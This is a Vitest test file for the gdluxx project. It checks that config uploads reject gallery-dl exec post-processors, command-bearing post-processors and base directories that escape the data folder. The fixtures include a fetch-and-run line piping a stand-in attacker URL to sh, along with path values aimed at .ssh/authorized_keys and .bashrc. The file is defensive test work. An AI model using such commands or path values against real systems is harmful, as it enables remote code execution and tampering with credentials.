/*
 * Copyright (C) 2025 jsouthgb
 *
 * This file is part of gdluxx.
 *
 * gdluxx is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 (GPL-2.0),
 * as published by the Free Software Foundation.
 */

/** `test.fails` cases define pending config-write containment behavior. */

import { afterEach, beforeEach, describe, expect, test, vi } from 'vitest';
import { mkdtemp, readFile, rm } from 'fs/promises';
import { tmpdir } from 'os';
import { join } from 'path';

const ORIGINAL_FILE_STORAGE_PATH = process.env.FILE_STORAGE_PATH;

// api-utils.ts imports `dev` from $app/environment, unavailable outside SvelteKit.
vi.mock('$app/environment', () => ({ dev: false, building: false, browser: false }));

vi.mock('$lib/server/logger', () => ({
  serverLogger: { info: vi.fn(), warn: vi.fn(), error: vi.fn(), debug: vi.fn() },
}));

// Mutable because the environment mock reads this at module initialization.
let dockerMockValue = false;
vi.mock('../src/lib/server/environment', () => ({
  isRunningInDockerCached: () => dockerMockValue,
}));

let dataDir: string;

beforeEach(async () => {
  dockerMockValue = false;
  dataDir = await mkdtemp(join(tmpdir(), 'gdluxx-config-hardening-'));
  process.env.FILE_STORAGE_PATH = dataDir;
  // config-utils.ts captures DATA_PATH from FILE_STORAGE_PATH at module
  // load time, so every test needs a fresh module graph for its own dataDir.
  vi.resetModules();
});

afterEach(async () => {
  await rm(dataDir, { recursive: true, force: true });
  if (ORIGINAL_FILE_STORAGE_PATH === undefined) {
    delete process.env.FILE_STORAGE_PATH;
  } else {
    process.env.FILE_STORAGE_PATH = ORIGINAL_FILE_STORAGE_PATH;
  }
});

function loadConfigUtils() {
  return import('../src/lib/server/config-utils');
}

function loadConfigRoute() {
  return import('../src/routes/api/config/+server');
}

function loadMergeRoute() {
  return import('../src/routes/api/config/merge/+server');
}

async function readConfigOnDisk(): Promise<string | null> {
  try {
    return await readFile(join(dataDir, 'config.json'), 'utf-8');
  } catch {
    return null;
  }
}

// Generic over the concrete route handler so the resulting event satisfies
// that handler's own (route-id-narrowed) RequestEvent type rather than the
// broader ambient RequestHandler from '@sveltejs/kit'.
function requestEvent<Handler extends (event: never) => unknown>(
  request: Request,
): Parameters<Handler>[0] {
  return { request, locals: { user: { id: 'test-user' } } } as Parameters<Handler>[0];
}

function benignConfig(baseDir: string): string {
  return JSON.stringify(
    {
      extractor: {
        'base-directory': baseDir,
        twitter: { username: 'user', password: 'hunter2', 'access-token': 'abc123' },
      },
    },
    null,
    2,
  );
}

// AUTH-002 fixture: a gallery-dl `exec` post-processor runs shell commands
// on every job invocation (`gallery-dl <url> --config data/config.json`).
function execPostprocessorNested(): string {
  return JSON.stringify({
    extractor: {
      postprocessors: [{ name: 'exec', command: ['touch', '/tmp/pwned'] }],
    },
  });
}

function execPostprocessorTopLevel(): string {
  return JSON.stringify({
    postprocessor: [{ name: 'exec', command: ['touch', '/tmp/pwned'] }],
  });
}

function commandBearingNonExecPostprocessor(): string {
  return JSON.stringify({
    extractor: {
      postprocessors: [{ name: 'metadata-plus', commands: ['curl http://evil.example/pwn | sh'] }],
    },
  });
}

const HOSTILE_BASE_DIRECTORIES = ['/root/.bashrc', '~/.ssh/authorized_keys', '../../etc'];

function multipartRequest(url: string, filename: string, body: string): Request {
  const form = new FormData();
  form.set('file', new File([body], filename, { type: 'application/json' }));
  return new Request(url, { method: 'POST', body: form });
}

function jsonConfigRequest(url: string, content: string): Request {
  return new Request(url, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ content }),
  });
}

function mergeRequest(url: string, path: string[], value: unknown): Request {
  return new Request(url, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ path, value, overwrite: true }),
  });
}

describe('writeConfigFile: benign config (regression guard)', () => {
  test('a normal gallery-dl config (extractors, base-directory under the data dir, auth tokens) saves successfully', async () => {
    const mod = await loadConfigUtils();
    const content = benignConfig(join(dataDir, 'downloads'));

    const result = await mod.writeConfigFile(content);

    expect(result.success).toBe(true);
    expect(await readConfigOnDisk()).toBe(content);
  });
});

describe('writeConfigFile: exec/command containment [REM-006]', () => {
  test.fails(
    'REM-006: writeConfigFile rejects an exec post-processor, nested and top-level [flip to test() when REM-006 lands]',
    async () => {
      const mod = await loadConfigUtils();

      await expect(mod.writeConfigFile(execPostprocessorNested())).rejects.toThrow();
      await expect(mod.writeConfigFile(execPostprocessorTopLevel())).rejects.toThrow();
    },
  );

  test.fails(
    'REM-006: writeConfigFile rejects a command-bearing non-exec post-processor [flip to test() when REM-006 lands]',
    async () => {
      const mod = await loadConfigUtils();

      await expect(mod.writeConfigFile(commandBearingNonExecPostprocessor())).rejects.toThrow();
    },
  );

  test.fails(
    'REM-006: writeConfigFile rejects a base-directory/path that escapes the data dir [flip to test() when REM-006 lands]',
    async () => {
      const mod = await loadConfigUtils();

      for (const hostilePath of HOSTILE_BASE_DIRECTORIES) {
        const content = JSON.stringify({ extractor: { 'base-directory': hostilePath } });
        await expect(mod.writeConfigFile(content)).rejects.toThrow();
      }
    },
  );
});

describe('POST /api/config: write-path containment [REM-006]', () => {
  test.fails(
    'REM-006: the multipart branch validates JSON before writing, not just the .json filename [flip to test() when REM-006 lands]',
    async () => {
      const { POST } = await loadConfigRoute();

      const response = await POST(
        requestEvent<typeof POST>(
          multipartRequest('http://localhost/api/config', 'config.json', 'not valid json {{'),
        ),
      );

      expect(response.status).toBeGreaterThanOrEqual(400);
      expect(await readConfigOnDisk()).toBeNull();
    },
  );

  test.fails(
    'REM-006: the multipart branch rejects an exec-bearing config [flip to test() when REM-006 lands]',
    async () => {
      const { POST } = await loadConfigRoute();

      const response = await POST(
        requestEvent<typeof POST>(
          multipartRequest('http://localhost/api/config', 'config.json', execPostprocessorNested()),
        ),
      );

      expect(response.status).toBeGreaterThanOrEqual(400);
      expect(await readConfigOnDisk()).toBeNull();
    },
  );

  test.fails(
    'REM-006: the JSON branch rejects an exec-bearing config [flip to test() when REM-006 lands]',
    async () => {
      const { POST } = await loadConfigRoute();

      const response = await POST(
        requestEvent<typeof POST>(
          jsonConfigRequest('http://localhost/api/config', execPostprocessorNested()),
        ),
      );

      expect(response.status).toBeGreaterThanOrEqual(400);
      expect(await readConfigOnDisk()).toBeNull();
    },
  );

  test.fails(
    'REM-006: POST /api/config/merge rejects an exec-bearing value [flip to test() when REM-006 lands]',
    async () => {
      const utilsMod = await loadConfigUtils();
      await utilsMod.writeConfigFile(benignConfig(join(dataDir, 'downloads')));

      const { POST: mergePost } = await loadMergeRoute();
      const response = await mergePost(
        requestEvent<typeof mergePost>(
          mergeRequest(
            'http://localhost/api/config/merge',
            ['extractor', 'postprocessors'],
            [{ name: 'exec', command: ['touch', '/tmp/pwned'] }],
          ),
        ),
      );

      expect(response.status).toBeGreaterThanOrEqual(400);
      const written = await readConfigOnDisk();
      expect(written).not.toContain('"exec"');
    },
  );
});
